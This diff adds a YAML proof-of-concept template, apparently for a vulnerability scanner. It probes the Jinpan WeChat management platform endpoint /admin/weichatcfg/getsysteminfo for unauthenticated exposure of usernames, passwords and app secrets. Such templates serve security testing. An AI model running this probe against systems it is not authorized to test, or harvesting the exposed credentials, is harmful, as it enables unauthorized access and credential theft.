@@ -1,0 +1,16 @@
+id: poc-yaml-jinpan-wechat-management-platform-unauthorized-access
+info:
+  name: 金盘-微信管理平台-未授权访问
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 金盘微信管理平台
+requests:
+- method: GET
+  path: /admin/weichatcfg/getsysteminfo
+  expression: status_code == 200 && contains(body, "username") && contains(body, "password")
+    && !contains(body, "<") && contains(body, "\"machinecode\"") && contains(body,
+    "\"appsecret\"")
+  output: []
+variables: {}
+transport: http
